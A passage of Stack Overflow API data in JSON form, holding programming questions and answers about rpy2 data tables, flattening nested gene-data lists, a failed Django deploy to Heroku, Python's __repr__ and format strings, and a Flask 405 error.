"display_name": "FlyingPickle", "link": "https://stackoverflow.com/users/6075349/flyingpickle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571867219, "creation_date": 1571864798, "question_id": 58530982, "link": "https://stackoverflow.com/questions/58530982/rpy2-handling-nested-data-tables-from-r", "title": "rpy2: handling nested data.tables from R", "body": "<p>I have R nested data.table of the format:</p>\n\n<pre><code>\nDate          Values\n2019-10-11    &lt;data.table&gt;\n2019-10-12    &lt;data.table&gt;\n\n</code></pre>\n\n<p>Each of the <code>Values</code> in the above data.table  are <code>&lt;data.table&gt;</code> are of the format:</p>\n\n<pre><code>Item     Inventory   Sales      Revenue\nClothing   100         50       100000\nAuto       50          20       5000\n</code></pre>\n\n<p>So essentially, for the date <code>2019-10-11</code> the corresponding data.table holds the sales details. </p>\n\n<p>I want to to be able to process this output and save it as independent pandas data frames.</p>\n\n<p>Looking at the rpy2 documentation (<a href=\"https://rpy2.readthedocs.io/en/version_2.8.x/introduction.html#importing-packages\" rel=\"nofollow noreferrer\">https://rpy2.readthedocs.io/en/version_2.8.x/introduction.html#importing-packages</a>) , one option appears to be to write a custom R function to process this and call it in python. But wondering if there is an easier way to take the R object and process it in python?\nThanks!</p>\n"}, {"tags": ["python", "string", "list", "tabs", "nested-lists"], "comments": [{"owner": {"reputation": 9079, "user_id": 7867968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c6976c101b7e5d81ad398cedf6a2ab9b?s=128&d=identicon&r=PG&f=1", "display_name": "C.Nivs", "link": "https://stackoverflow.com/users/7867968/c-nivs"}, "edited": false, "score": 0, "creation_date": 1571864904, "post_id": 58530970, "comment_id": 103385834, "body": "is this a <code>list</code> or a <code>string</code>?"}, {"owner": {"reputation": 5059, "user_id": 1428102, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/OEl5y.jpg?s=128&g=1", "display_name": "abhilb", "link": "https://stackoverflow.com/users/1428102/abhilb"}, "edited": false, "score": 0, "creation_date": 1571865000, "post_id": 58530970, "comment_id": 103385867, "body": "try &#39; &#39;.join without a space between the quotes."}, {"owner": {"reputation": 70549, "user_id": 4785185, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ChR5h.jpg?s=128&g=1", "display_name": "Prune", "link": "https://stackoverflow.com/users/4785185/prune"}, "edited": false, "score": 0, "creation_date": 1571865003, "post_id": 58530970, "comment_id": 103385868, "body": "Welcome to StackOverflow. Please read and follow the posting guidelines in the help documentation, as suggested when you created this account. <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">Minimal, complete, verifiable example</a> applies here. We cannot effectively help you until you post your MCVE code and accurately specify the problem. We should be able to paste your posted code into a text file and reproduce the problem you specified. The input you give is not a legal Python object, so we&#39;re not sure what you&#39;re actually using."}, {"owner": {"reputation": 9, "user_id": 8792274, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcdd137ee48e7af6175b0103cbb4faba?s=128&d=identicon&r=PG&f=1", "display_name": "Unionicola", "link": "https://stackoverflow.com/users/8792274/unionicola"}, "edited": false, "score": 0, "creation_date": 1571865101, "post_id": 58530970, "comment_id": 103385900, "body": "I made a nested list (I think anyway) from a dictionary, where the key was Gene_Orf or GeneA and the value was a nested list. I put them into a nested list using thinking it would be easier to get them how I need to export the values to a text file."}, {"owner": {"reputation": 9079, "user_id": 7867968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c6976c101b7e5d81ad398cedf6a2ab9b?s=128&d=identicon&r=PG&f=1", "display_name": "C.Nivs", "link": "https://stackoverflow.com/users/7867968/c-nivs"}, "edited": false, "score": 0, "creation_date": 1571865155, "post_id": 58530970, "comment_id": 103385920, "body": "The reason it&#39;s printing like that is what you&#39;ve posted at the top is a string, I&#39;m assuming wrapped in double quotes. <code>str.join</code> will not work on non-string objects unless they are converted to strings, which you don&#39;t do. How are you building this string? What does it actually look like? Can you add both of those things to the question?"}, {"owner": {"reputation": 9079, "user_id": 7867968, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c6976c101b7e5d81ad398cedf6a2ab9b?s=128&d=identicon&r=PG&f=1", "display_name": "C.Nivs", "link": "https://stackoverflow.com/users/7867968/c-nivs"}, "edited": false, "score": 0, "creation_date": 1571865294, "post_id": 58530970, "comment_id": 103385959, "body": "Ok, can you also include how you build that dictionary? I think you have an XY problem. It looks like you are trying to create a dataframe or some sort of space-delimited file, so starting at the very beginning might help identify the issue at hand"}, {"owner": {"reputation": 9, "user_id": 8792274, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcdd137ee48e7af6175b0103cbb4faba?s=128&d=identicon&r=PG&f=1", "display_name": "Unionicola", "link": "https://stackoverflow.com/users/8792274/unionicola"}, "edited": false, "score": 0, "creation_date": 1571865931, "post_id": 58530970, "comment_id": 103386161, "body": "Thanks for the advice. I edited the post to show how I made the dictionary and the nested list."}], "answers": [{"tags": [], "owner": {"reputation": 9, "user_id": 8792274, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcdd137ee48e7af6175b0103cbb4faba?s=128&d=identicon&r=PG&f=1", "display_name": "Unionicola", "link": "https://stackoverflow.com/users/8792274/unionicola"}, "is_accepted": false, "score": 0, "last_activity_date": 1571930359, "creation_date": 1571930359, "answer_id": 58544412, "question_id": 58530970, "link": "https://stackoverflow.com/questions/58530970/flatten-nested-list-to-flat-list-containing-strings/58544412#58544412", "title": "Flatten Nested List to Flat List Containing Strings", "body": "<p>I figured out how to solve my problem and wanted to post the solution in case it helps anyone else out in the future.</p>\n\n<p>I used the following code to write the dictionary keys and values to a list, wherein the values are separated by tabs, then sort the list and write it all to a file (my ultimate goal):</p>\n\n<pre><code>combined = [ ]\nfor key, val in dict.items():\n\n    #this should flatten the nested list that makes up the values\n    val2 = [val for sublist in combo[key] for val in sublist] \n\n    #separate the flattened list of values with tabs\n    val3 = \"\\t\".join(val2) \n\n    #write each key and value to a list with new lines at the end of the values\n    combined.append(f\"{key}\\t{val3}\\n\") \n\n    #sort the list starting at the second row, leaving the header first\n    combined[1:] = sorted(combined[1:]) \n\n#write each line to a text file\nwith open(\"final.txt\", 'w') as f:\n    for each in combined:\n        f.write(each) \n</code></pre>\n\n<p>I'm sure there are other ways I could improve this code, but it seems to be working for me.</p>\n"}], "owner": {"reputation": 9, "user_id": 8792274, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcdd137ee48e7af6175b0103cbb4faba?s=128&d=identicon&r=PG&f=1", "display_name": "Unionicola", "link": "https://stackoverflow.com/users/8792274/unionicola"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 218, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1571930359, "creation_date": 1571864705, "last_edit_date": 1571865904, "question_id": 58530970, "link": "https://stackoverflow.com/questions/58530970/flatten-nested-list-to-flat-list-containing-strings", "title": "Flatten Nested List to Flat List Containing Strings", "body": "<p>Making the dictionary:  </p>\n\n<p>I have a set of 50 text files, all set up with a first header row, the first column being gene names, and the remaining columns being values for each gene. I also have an official gene list text file. I want to use the official gene name list to build a dictionary, then iterate over the files, determine if the gene name for each line matches the gene name in the dictionary, and if it does, append the dictionary value with the additional values from the experimental file.</p>\n\n<p>So the experimental file looks like this:</p>\n\n<pre><code>Gene_ORF    ExpA    ExpB\ngeneA   12      34\ngeneB   42      10\ngeneC   42      10\n</code></pre>\n\n<p>The official gene list looks like this:</p>\n\n<pre><code>Gene_ORF    \ngeneA   \ngeneC\n</code></pre>\n\n<p>I used the following code to iterate over all the files in a directory and make the dictionary:</p>\n\n<pre><code>dict = {}\n\ndf_list_all = [ fn for fn in os.listdir(os.getcwd()) if fn.endswith(\"results.txt\") ]\n\nwith open(\"gene_orf.txt\", 'r') as f:\n        for line in f:\n            name = line.split('\\n')[0]\n            dict[name]= []\n\nfor each in df_list_all:\n    with open(each, 'r') as g:\n        for each in g:\n            gene = each.split('\\t')[0]\n            data = each.rstrip('\\n').split('\\t')[1:]\n            if gene in dict:\n                dict[gene].append(data)\n</code></pre>\n\n<p>So the dictionary looks like this:</p>\n\n<pre><code>{ 'Gene_ORF': [['ExpA', 'ExpB'], ['ExpC']], 'geneA': [['12, '34'], ['42']]...}\n</code></pre>\n\n<p>I used the following code to convert the dictionary into a nested list:</p>\n\n<pre><code>nestedList = [ ]\nfor key, val in dict.items():\n    nestedList.append(f\"{key} \\t {val} \\n\")\n</code></pre>\n\n<p>That resulted in a nested list that is composed like the following:</p>\n\n<pre><code>\"Gene_ORF \\t [['ExpA', 'ExpB'], ['ExpC']] \\n GeneA \\t [['12', '34'], ['42']] \\n\"\n</code></pre>\n\n<p>I am trying to flatten the nested list, but am running it to issues dealing with the strings. I've tried several things, including:</p>\n\n<pre><code>flatList = ' '.join([data for ele in nestedList for data in ele])\n</code></pre>\n\n<p>and </p>\n\n<pre><code>flatList = []\nfor elem in nestedList:\n    flatList.extend(elem)\n</code></pre>\n\n<p>But every time, I get a result like this:</p>\n\n<pre><code>O R F _ G e n e   \\t.  [ [ ' E x p A ' , ' E x p B ' ] , [ ' E x p C ' ] ]   \\n\n</code></pre>\n\n<p>I'd like the flatList to look like this:</p>\n\n<pre><code>Gene_ORF \\t ExpA \\t ExpB \\t ExpC\nGeneA \\t 12 \\t 34 \\t 42\n</code></pre>\n\n<p>Because I'd like to write all that to a final so it looks like this:</p>\n\n<pre><code>Gene_ORF    ExpA    ExpB    ExpC\nGeneA       12      34      42\n</code></pre>\n\n<p>I'd really appreciate any help or advice you have.</p>\n\n<p>EDIT:  Edited to indicate how I made the nested list in the first place.</p>\n"}, {"tags": ["python", "django", "heroku"], "owner": {"reputation": 21, "user_id": 12265475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/529f1923eb4228a80e344dd20a84896e?s=128&d=identicon&r=PG&f=1", "display_name": "mitchm001", "link": "https://stackoverflow.com/users/12265475/mitchm001"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 24, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1571864572, "creation_date": 1571864572, "question_id": 58530945, "link": "https://stackoverflow.com/questions/58530945/i-am-having-issues-uploading-a-python-project-using-django-to-heroku", "title": "I am having issues uploading a Python project (using Django) to Heroku", "body": "<p>I am trying to deploy a Python project to Heroku.  When i press the \"Deploy Branch\" button on the Heroku website ... <a href=\"https://dashboard.heroku.com/apps/\" rel=\"nofollow noreferrer\">https://dashboard.heroku.com/apps/</a>/deploy/github i get this error.</p>\n\n<p>Installing requirements with pip</p>\n\n<p>$ python manage.py collectstatic --noinput</p>\n\n<pre><code>   Traceback (most recent call last):\n     File \"manage.py\", line 21, in &lt;module&gt;\n       main()\n     File \"manage.py\", line 17, in main\n       execute_from_command_line(sys.argv)\n     File \"/app/.heroku/python/lib/python3.6/site-packages/django/core/management/__init__.py\", line 381, in execute_from_command_line\n       utility.execute()\n     File \"/app/.heroku/python/lib/python3.6/site-packages/django/core/management/__init__.py\", line 357, in execute\n       django.setup()\n     File \"/app/.heroku/python/lib/python3.6/site-packages/django/__init__.py\", line 24, in setup\n       apps.populate(settings.INSTALLED_APPS)\n     File \"/app/.heroku/python/lib/python3.6/site-packages/django/apps/registry.py\", line 91, in populate\n       app_config = AppConfig.create(entry)\n     File \"/app/.heroku/python/lib/python3.6/site-packages/django/apps/config.py\", line 116, in create\n       mod = import_module(mod_path)\n     File \"/app/.heroku/python/lib/python3.6/importlib/__init__.py\", line 126, in import_module\n       return _bootstrap._gcd_import(name[level:], package, level)\n     File \"&lt;frozen importlib._bootstrap&gt;\", line 994, in _gcd_import\n     File \"&lt;frozen importlib._bootstrap&gt;\", line 971, in _find_and_load\n     File \"&lt;frozen importlib._bootstrap&gt;\", line 941, in _find_and_load_unlocked\n     File \"&lt;frozen importlib._bootstrap&gt;\", line 219, in _call_with_frames_removed\n     File \"&lt;frozen importlib._bootstrap&gt;\", line 994, in _gcd_import\n     File \"&lt;frozen importlib._bootstrap&gt;\", line 971, in _find_and_load\n     File \"&lt;frozen importlib._bootstrap&gt;\", line 953, in _find_and_load_unlocked\n   ModuleNotFoundError: No module named 'blog'\n\n Error while running '$ python manage.py collectstatic --noinput'.\n   See traceback above for details.\n   You may need to update application code to resolve this error.\n   Or, you can disable collectstatic for this application:\n      $ heroku config:set DISABLE_COLLECTSTATIC=1\n   https://devcenter.heroku.com/articles/django-assets\n  Push rejected, failed to compile Python app.\n  Push failed\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "class", "methods", "tuples"], "comments": [{"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 2, "creation_date": 1571864572, "post_id": 58530935, "comment_id": 103385713, "body": "look carefully, both functions return formatted strings, not tuples"}, {"owner": {"reputation": 85, "user_id": 9788536, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-kBXGTowuNus/AAAAAAAAAAI/AAAAAAAAEZU/2pZKZGUKUso/photo.jpg?sz=128", "display_name": "Saswata Mishra", "link": "https://stackoverflow.com/users/9788536/saswata-mishra"}, "reply_to_user": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 0, "creation_date": 1571864701, "post_id": 58530935, "comment_id": 103385755, "body": "Okay true, but how&#39;s the whole thing working?"}, {"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1571864771, "post_id": 58530935, "comment_id": 103385781, "body": "its just returning a string. Thats all"}, {"owner": {"reputation": 85, "user_id": 9788536, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-kBXGTowuNus/AAAAAAAAAAI/AAAAAAAAEZU/2pZKZGUKUso/photo.jpg?sz=128", "display_name": "Saswata Mishra", "link": "https://stackoverflow.com/users/9788536/saswata-mishra"}, "edited": false, "score": 0, "creation_date": 1571865008, "post_id": 58530935, "comment_id": 103385872, "body": "Yeah, but what are those {0.x!r} and all? Can&#39;t decode the meaning."}, {"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 0, "creation_date": 1571865070, "post_id": 58530935, "comment_id": 103385885, "body": "@SaswataMishra that&#39;s just string formatting, it has nothing to do with these methods, and you should ask a different question about them"}, {"owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "edited": false, "score": 2, "creation_date": 1571865117, "post_id": 58530935, "comment_id": 103385905, "body": "@SaswataMishra <a href=\"https://docs.python.org/3/library/string.html#format-string-syntax\" rel=\"nofollow noreferrer\">The docs</a> cover this in great detail."}, {"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1571865153, "post_id": 58530935, "comment_id": 103385919, "body": "Those are just formatting place holders. that tell how to format/present the variables passed o the format method. you can look up the formting mini language in the python docs <a href=\"https://docs.python.org/3.4/library/string.html#formatspec\" rel=\"nofollow noreferrer\">docs.python.org/3.4/library/string.html#formatspec</a>"}], "answers": [{"tags": [], "owner": {"reputation": 19107, "user_id": 216356, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/dc105cdd75395154274f9da3d7612a9f?s=128&d=identicon&r=PG", "display_name": "Noctis Skytower", "link": "https://stackoverflow.com/users/216356/noctis-skytower"}, "is_accepted": false, "score": 0, "last_activity_date": 1571865151, "last_edit_date": 1571865151, "creation_date": 1571864809, "answer_id": 58530987, "question_id": 58530935, "link": "https://stackoverflow.com/questions/58530935/cant-getting-the-implementation-of-repr-method-in-python/58530987#58530987", "title": "Can&#39;t getting the implementation of __repr__() method in python", "body": "<p>You might want to try this in an interpreter to see what is going on:</p>\n\n<pre><code>&gt;&gt;&gt; class Point:\n    def __init__(self, x, y):\n        \"\"\"Initialize self.\"\"\"\n        self.x, self.y = x, y\n    def __repr__(self):\n        \"\"\"Return repr(self).\"\"\"\n        return f'{type(self).__name__}({self.x!r}, {self.y!r})'\n    def __str__(self):\n        \"\"\"Return str(self).\"\"\"\n        return f'({self.x!s}, {self.y!s})'\n\n&gt;&gt;&gt; Point(1, 2) # causes implicit call to __repr__\nPoint(1, 2)\n&gt;&gt;&gt; print(_) # causes implicit call to __str__\n(1, 2)\n&gt;&gt;&gt; \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "is_accepted": false, "score": 2, "last_activity_date": 1571864970, "creation_date": 1571864970, "answer_id": 58531024, "question_id": 58530935, "link": "https://stackoverflow.com/questions/58530935/cant-getting-the-implementation-of-repr-method-in-python/58531024#58531024", "title": "Can&#39;t getting the implementation of __repr__() method in python", "body": "<p>Both <code>__repr__</code> and <code>__str__</code> in your example return formatted strings, not tuples. These functions are called when either <code>repr()</code> or <code>str()</code> is called on the object, explicitly or implicitly.</p>\n\n<p>For example, a <code>print(Point(1,2))</code> would print the result of <code>__str__</code> because it calls <code>str()</code> on the object internally, but <code>print([Point(1,2)])</code> would print the result of <code>__repr__</code> instead.</p>\n\n<p>For your own objects, these methods can return anything you want, just as long as those are just strings.</p>\n"}, {"tags": [], "owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "is_accepted": false, "score": 1, "last_activity_date": 1571865755, "creation_date": 1571865755, "answer_id": 58531161, "question_id": 58530935, "link": "https://stackoverflow.com/questions/58530935/cant-getting-the-implementation-of-repr-method-in-python/58531161#58531161", "title": "Can&#39;t getting the implementation of __repr__() method in python", "body": "<p>Here's a breakdown of the specific <a href=\"https://docs.python.org/3/library/string.html#format-string-syntax\" rel=\"nofollow noreferrer\">formatting syntax</a>. With the <code>str.format</code> method you can fill-in placeholders in the given string instance that are of the form <code>{...}</code>. These work with positional arguments in the following way:</p>\n\n<pre><code>&gt;&gt;&gt; '{}:{}'.format(1, 2)\n'1:2'\n&gt;&gt;&gt; '{0}:{1}'.format(1, 2)\n'1:2'\n&gt;&gt;&gt; '{1}:{0}'.format(1, 2)\n'2:1'\n</code></pre>\n\n<p>That means you can specify the number of the positional argument inside the curly braces. The string can refer to a positional argument multiple times:</p>\n\n<pre><code>&gt;&gt;&gt; '{0}:{1}:{0}'.format(1, 2)\n'1:2:1'\n</code></pre>\n\n<p>Using <code>.x</code> notation let's you access attributes of that argument. For example:</p>\n\n<pre><code>&gt;&gt;&gt; class Test:\n...     x = 1\n...     y = 2\n... \n&gt;&gt;&gt; '{0.x}:{0.y}'.format(Test)\n'1:2'\n</code></pre>\n\n<p>Using <code>!r</code> you can force to use the <code>__repr__</code> of that object rather than the <code>__str__</code>. For example:</p>\n\n<pre><code>&gt;&gt;&gt; class Test:\n...     def __str__(self):\n...         return '__str__'\n...     def __repr__(self):\n...         return '__repr__'\n... \n&gt;&gt;&gt; '{0}'.format(Test())\n'__str__'\n&gt;&gt;&gt; '{0!s}'.format(Test())\n'__str__'\n&gt;&gt;&gt; '{0!r}'.format(Test())\n'__repr__'\n</code></pre>\n\n<p>So combining all this information we get the following:</p>\n\n<pre><code>'Point({0.x!r}, {0.y!r})'.format(self)\n</code></pre>\n\n<p>Here a format string with two placeholders is defined (<code>{0.x!r}</code> and <code>{0.y!r}</code>). They should be filled in with the first positional argument's <code>x</code> and <code>y</code> attributes (recall that <code>{0}</code> will be substituted with the first argument, so <code>{0.x}</code> requests the <code>x</code> attribute of that argument). And finally the <code>!r</code> requests the <code>__repr__</code> of that object rather than the <code>__str__</code> (which is the default).</p>\n\n<p>The same reasoning applies to the <code>__str__</code> method.</p>\n\n<p>By the way, the formatting syntax also allows keyword arguments and they can be referred to by their name:</p>\n\n<pre><code>&gt;&gt;&gt; '{first}:{second}'.format(first=1, second=2)\n'1:2'\n&gt;&gt;&gt; '{second}:{first}'.format(first=1, second=2)\n'2:1'\n</code></pre>\n"}], "owner": {"reputation": 85, "user_id": 9788536, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-kBXGTowuNus/AAAAAAAAAAI/AAAAAAAAEZU/2pZKZGUKUso/photo.jpg?sz=128", "display_name": "Saswata Mishra", "link": "https://stackoverflow.com/users/9788536/saswata-mishra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "answer_count": 3, "score": 3, "last_activity_date": 1571865755, "creation_date": 1571864507, "question_id": 58530935, "link": "https://stackoverflow.com/questions/58530935/cant-getting-the-implementation-of-repr-method-in-python", "title": "Can&#39;t getting the implementation of __repr__() method in python", "body": "<p>I was reading the famous book on python named 'python cookbook' by David Beazley and Brian K. Jones. In their 'classes and objects' chapter, they have written the following code: </p>\n\n<pre><code>class Point:\n    def __init__(self,x,y):\n        self.x = x\n        self.y = y\n    def __repr__(self):\n        return 'Point({0.x!r}, {0.y!r})'.format(self)\n    def __str__(self):\n        return '({0.x!s}, {0.y!s})'.format(self)\n</code></pre>\n\n<p>Now, only I got to understand that the <strong>repr</strong>() method is used to represent an object to a developer and <strong>str</strong>() to a blind user. But in both the methods, what is being happened after 'return'? There are tuples in both cases for sure. But what kinda member the tuples have? I haven't seen anything like this before.</p>\n"}, {"tags": ["python", "google-chrome", "flask"], "comments": [{"owner": {"reputation": 7629, "user_id": 978005, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/9219975d0b744e19422761516d419f12?s=128&d=identicon&r=PG", "display_name": "Phix", "link": "https://stackoverflow.com/users/978005/phix"}, "edited": false, "score": 0, "creation_date": 1571864960, "post_id": 58530911, "comment_id": 103385855, "body": "Just checking the correct route is <code>&#47;static&#47;predict</code> and not just <code>&#47;predict</code>"}, {"owner": {"reputation": 33, "user_id": 11901042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd0f4422214d36059508843bb539c58e?s=128&d=identicon&r=PG&f=1", "display_name": "Patrieszka", "link": "https://stackoverflow.com/users/11901042/patrieszka"}, "reply_to_user": {"reputation": 7629, "user_id": 978005, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/9219975d0b744e19422761516d419f12?s=128&d=identicon&r=PG", "display_name": "Phix", "link": "https://stackoverflow.com/users/978005/phix"}, "edited": false, "score": 0, "creation_date": 1571865555, "post_id": 58530911, "comment_id": 103386049, "body": "I changed it to /static/predict and got: jquery-3.3.1.min.js:2 POST <a href=\"http://0.0.0.0:5000/static/predict\" rel=\"nofollow noreferrer\">0.0.0.0:5000/static/predict</a> 400 (BAD REQUEST)"}], "answers": [{"tags": [], "owner": {"reputation": 93, "user_id": 8909963, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0bd236180eb1aa1eaafe5b4ff1d9e38d?s=128&d=identicon&r=PG&f=1", "display_name": "Ahmed", "link": "https://stackoverflow.com/users/8909963/ahmed"}, "is_accepted": true, "score": 0, "last_activity_date": 1571874697, "creation_date": 1571874697, "answer_id": 58532344, "question_id": 58530911, "link": "https://stackoverflow.com/questions/58530911/method-not-allowed-while-making-webpage-in-flask/58532344#58532344", "title": "&#39;Method not allowed&#39; while making webpage in flask", "body": "<p>Your JS code has </p>\n\n<pre class=\"lang-js prettyprint-override\"><code>$.post(\"http://0.0.0.0:5000/static/predict\")\n</code></pre>\n\n<p>but your Flask route is</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>@app.route(\"/predict\", methods=[\"POST\"])\ndef predict():\n</code></pre>\n\n<p>Because the snippet you posted doesn't show that you're prepending <code>/static/</code> to all routes, it looks like that's a mistake. </p>\n\n<p>You specified <code>methods=['POST']</code> correctly, so visiting <code>127.0.0.1:5000/predict</code> should yield the expected result.</p>\n\n<p>If you wanted to check <code>0.0.0.0:5000/predict</code>, you need to add <code>app.run(host='0.0.0.0')</code>(See: <a href=\"https://stackoverflow.com/questions/7023052/configure-flask-dev-server-to-be-visible-across-the-network\">Configure Flask dev server to be visible across the network</a>). </p>\n"}], "owner": {"reputation": 33, "user_id": 11901042, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd0f4422214d36059508843bb539c58e?s=128&d=identicon&r=PG&f=1", "display_name": "Patrieszka", "link": "https://stackoverflow.com/users/11901042/patrieszka"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 106, "favorite_count": 0, "accepted_answer_id": 58532344, "answer_count": 1, "score": 0, "last_activity_date": 1571874697, "creation_date": 1571864354, "last_edit_date": 1571865618, "question_id": 58530911, "link": "https://stackoverflow.com/questions/58530911/method-not-allowed-while-making-webpage-in-flask", "title": "&#39;Method not allowed&#39; while making webpage in flask", "body": "<p>I'm writing flask api using keras. However I get a lot of errors. One of them is Error 405 - method not allowed. \nPOST <a href=\"http://0.0.0.0:5000/static/predict\" rel=\"nofollow noreferrer\">http://0.0.0.0:5000/static/predict</a> 405 (METHOD NOT ALLOWED) jquery-3.3.1.min.js\nI'm trying to get predictions written on the page, but they didn't show even before that error 405. \nI don't know which place can lead to that error.</p>\n\n<p>Here is code:\npredict.html</p>\n\n<pre><code>&lt;body&gt;\n    &lt;input id=\"image-selector\" type=\"file\"&gt;\n    &lt;button id=\"predict-button\"&gt; Predict&lt;/button&gt;\n\n    &lt;p style=\"font-weight:bold\"&gt;Predictions&lt;/p&gt;\n    &lt;p&gt; Jablko &lt;span id=\"apple-prediction\"&gt;&lt;/span&gt;&lt;/p&gt;\n    &lt;p&gt; Banan &lt;span id=\"banana-prediction\"&gt;&lt;/span&gt;&lt;/p&gt;\n\n    &lt;img id=\"selected-image\" src=\"\"/&gt;\n\n    &lt;script src=\"https://code.jquery.com/jquery-3.3.1.min.js\"&gt;&lt;/script&gt;\n    &lt;script&gt;\n        let base64Image;\n        $(\"#image-selector\").change(function(){\n        let reader = new FileReader();\n        reader.onload = function(e){\n            let dataURL = reader.result;\n            $('#selected-image').attr(\"src\", dataURL);\n            base64Image = dataURL.replace(\"data:image/jpg;base64,\", \"\");\n            //console.log(base64Image);\n            }\n            reader.readAsDataURL($(\"#image-selector\")[0].files[0]);\n            $(\"#apple-prediction\").text(\"\");\n            $(\"#banana-prediction\").text(\"\");\n            });\n\n            $(\"#predict-button\").click(function(event){\n                let message = {\n                    image:base64Image\n                }\n                //console.log(message);\n                $.post(\"http://0.0.0.0:5000/static/predict\", function(response){\n                    $(\"#apple-prediction\").text(response.prediction.apple.toFixed(6));\n                    $(\"#banana-prediction\").text(response.prediction.banana.toFixed(6));\n                    console.log(response);\n                });\n            });\n    &lt;/script&gt;\n&lt;/body&gt;\n</code></pre>\n\n<p>predict.py</p>\n\n<pre><code>app = Flask(__name__)\n\ndef get_model():\n    global model\n    model=load_model('fc_model1.h5')\n    #model.load_weights('model_grocery.h5')\n    #graph = tf.get_default_graph\n    print(\"** Model loaded!\")\n\ndef preprocess_image(image, target_size):\n    image = image.resize(target_size)\n    image = image.img_to_array(image)\n    image = np.expand_dims(image, axis=0)\n    return image\n\nprint(\"**Loading model**\")\nget_model()\n\n@app.route(\"/predict\", methods=[\"POST\"])\ndef predict():\n    message = request.get_json(force=True)\n    encoded = message['image']\n    decoded = base64.b64decode(encoded)\n    image = Image.open(io.BytesIO(decoded))\n\n    processed_image = preprocess_image(image, target_size=(224, 224))\n    #bt_prediction = vgg16.predict(processed_image)\n    prediction = model.predict(processed_image).tolist()\n\n    response = {\n        'prediction': {\n            'apple': prediction[0][0],\n            'banana': prediction[0][1]\n        }\n    }\n    return jsonify(response)\n\n</code></pre>\n\n<p>The error shows in google-chrome.</p>\n"}, {"tags": ["python", "pandas"], "comments": [{"owner": {"reputation": 306, "user_id": 12091446, "user_type": "registered", "profile_image": "https://graph.facebook.com/2211404125649261/picture?type=large", "display_name": "Jack Hanson", "link": 